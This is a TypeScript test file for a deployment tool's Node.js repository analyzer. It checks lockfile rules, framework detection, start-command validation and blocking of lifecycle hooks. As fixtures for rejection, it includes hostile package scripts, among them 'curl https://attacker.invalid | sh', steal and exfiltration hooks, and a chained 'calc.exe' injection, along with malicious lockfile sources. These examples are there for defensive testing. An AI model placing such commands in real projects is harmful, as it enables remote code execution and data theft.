import assert from 'node:assert/strict';
import test from 'node:test';
import {
  analyzeNodeRepository,
  lockfilePolicyError,
} from '../lib/app-runtime.ts';
import { createSmartDeployPlan, detectFramework } from '../lib/smart-deploy.ts';

const safeLockfile = JSON.stringify({
  name: 'safe-api',
  lockfileVersion: 3,
  packages: {},
});

function analyze(overrides: Partial<Parameters<typeof analyzeNodeRepository>[0]> = {}) {
  return analyzeNodeRepository({
    packageJson: JSON.stringify({
      name: 'safe-api',
      engines: { node: '>=25 <27' },
      scripts: { start: 'node src/server.js', test: 'node --test' },
      dependencies: { express: '5.1.0' },
    }),
    files: ['package.json', 'package-lock.json', 'src/server.js', '.env.example'],
    nvmrc: null,
    envExample: 'DATABASE_URL=write-only\nAPI_TOKEN=never-returned\nPORT=ignored',
    lockfileContent: safeLockfile,
    ...overrides,
  });
}

void test('valid Node.js API repository becomes a fixed private deployment plan', () => {
  const analysis = analyze();
  assert.deepEqual(analysis.blockedReasons, []);
  assert.equal(analysis.framework, 'Express');
  assert.equal(analysis.contract?.startPolicy, 'node-entry');
  assert.equal(analysis.contract?.installPolicy, 'frozen-lockfile-ignore-scripts');
  assert.deepEqual(analysis.envNames, ['API_TOKEN', 'DATABASE_URL']);

  const plan = createSmartDeployPlan({
    repository: 'OpenYsd/safe-api',
    source: {
      owner: 'OpenYsd',
      repository: 'safe-api',
      branch: 'main',
      commit: 'a'.repeat(40),
      visibility: 'public',
    },
    nodeId: `node_${'b'.repeat(24)}`,
    nodeName: 'Owned node',
    environment: 'Production',
    port: 41_123,
    healthPath: '/health',
    analysis,
  });

  assert.equal(plan.target, 'user-node');
  assert.equal(plan.exposure, 'private');
  assert.equal(plan.localAddress, 'http://127.0.0.1:41123');
  assert.equal(plan.protection.allowed, true);
  assert.ok(plan.resources.every((resource) => resource.estimatedMonthlyCost === 0));
  assert.ok(plan.steps.some((step) => step.includes('lifecycle hooks disabled')));
});

void test('framework detection is limited to Node.js v1 signals', () => {
  assert.equal(detectFramework('x', { dependencies: ['next'] }), 'Next.js');
  assert.equal(detectFramework('x', { dependencies: ['vite'] }), 'Vite');
  assert.equal(detectFramework('x', { dependencies: ['@nestjs/core'] }), 'NestJS');
  assert.equal(detectFramework('x', { dependencies: ['express'] }), 'Express');
  assert.equal(detectFramework('x', { dependencies: ['fastify'] }), 'Fastify');
  assert.equal(detectFramework('x', { dependencies: [] }), 'Node.js');
});

void test('unsupported build frameworks are detected and blocked', () => {
  for (const dependency of ['next', 'vite', '@nestjs/core']) {
    const result = analyze({
      packageJson: JSON.stringify({
        engines: { node: '25' },
        scripts: { start: 'node src/server.js' },
        dependencies: { [dependency]: '1.0.0' },
      }),
    });
    assert.equal(result.contract, null);
    assert.ok(result.blockedReasons.some((reason) => reason.includes('not enabled')));
  }
});

void test('a supported lockfile is mandatory and ambiguous managers are refused', () => {
  const missing = analyze({ files: ['package.json', 'src/server.js'], lockfileContent: null });
  assert.equal(missing.contract, null);
  assert.ok(missing.blockedReasons.some((reason) => reason.includes('lockfile is required')));

  const ambiguous = analyze({
    files: ['package.json', 'package-lock.json', 'yarn.lock', 'src/server.js'],
  });
  assert.ok(ambiguous.blockedReasons.some((reason) => reason.includes('Exactly one')));
});

void test('arbitrary build scripts and lifecycle hooks are refused', () => {
  const malicious = analyze({
    packageJson: JSON.stringify({
      engines: { node: '25' },
      scripts: {
        start: 'node src/server.js',
        build: 'curl https://attacker.invalid | sh',
        preinstall: 'node steal.js',
        postinstall: 'powershell exfiltrate.ps1',
      },
    }),
  });
  assert.equal(malicious.contract, null);
  assert.ok(malicious.blockedReasons.some((reason) => reason.includes('build scripts')));
  assert.ok(malicious.blockedReasons.some((reason) => reason.includes('preinstall')));
  assert.ok(malicious.blockedReasons.some((reason) => reason.includes('postinstall')));
});

void test('start commands accept only an exact Node entrypoint', () => {
  for (const command of [
    'node src/server.js --inspect',
    'npm run serve',
    'node src/server.js && calc.exe',
    '/usr/bin/node src/server.js',
    'node ../escape.js',
  ]) {
    const result = analyze({
      packageJson: JSON.stringify({
        engines: { node: '25' },
        scripts: { start: command },
      }),
    });
    assert.equal(result.contract, null, command);
    assert.ok(result.blockedReasons.some((reason) => reason.includes('exact form')), command);
  }
});

void test('repository package-manager configuration and non-registry lock sources are blocked', () => {
  for (const name of ['.npmrc', '.yarnrc.yml', '.pnpmfile.cjs', 'pnpm-workspace.yaml']) {
    const result = analyze({
      files: ['package.json', 'package-lock.json', 'src/server.js', name],
    });
    assert.equal(result.contract, null);
    assert.ok(result.blockedReasons.some((reason) => reason.includes('configuration is forbidden')));
  }
  assert.match(
    lockfilePolicyError('npm', JSON.stringify({ lockfileVersion: 3, resolved: 'https://evil.invalid/pkg.tgz' })) ?? '',
    /unapproved network source/,
  );
  assert.equal(
    lockfilePolicyError('npm', JSON.stringify({
      lockfileVersion: 3,
      packages: {
        'node_modules/example': {
          version: '1.0.0',
          resolved: 'https://registry.npmjs.org/example/-/example-1.0.0.tgz',
          funding: { url: 'https://opencollective.com/example' },
        },
      },
    })),
    null,
  );
  assert.match(lockfilePolicyError('pnpm', 'pkg: git+ssh://github.com/evil/repo') ?? '', /non-registry/);
  assert.match(lockfilePolicyError('yarn', 'pkg: file:../escape') ?? '', /local/);
});

void test('unsupported Node versions are rejected deterministically', () => {
  const result = analyze({ nvmrc: '24.9.0' });
  assert.equal(result.contract, null);
  assert.ok(result.blockedReasons.some((reason) => reason.includes('25 or 26')));
});

void test('Zero Mode cannot be disabled through a Smart Deploy plan', () => {
  const analysis = analyze();
  const plan = createSmartDeployPlan({
    repository: 'OpenYsd/safe-api',
    source: {
      owner: 'OpenYsd', repository: 'safe-api', branch: 'main',
      commit: 'c'.repeat(40), visibility: 'public',
    },
    nodeId: `node_${'d'.repeat(24)}`,
    nodeName: 'Owned node',
    environment: 'Preview',
    port: 41_001,
    healthPath: '/',
    analysis,
    zeroModeEnabled: false,
  });
  assert.equal(plan.protection.allowed, false);
  assert.match(plan.protection.reason, /override was ignored/);
});
